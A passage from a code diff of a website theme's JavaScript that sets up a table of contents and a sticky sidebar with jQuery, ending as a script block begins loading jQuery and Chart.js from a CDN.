+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
 </script><script>
   window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
     var $canvas = null, $this = null, _ctx = null, _text = '';
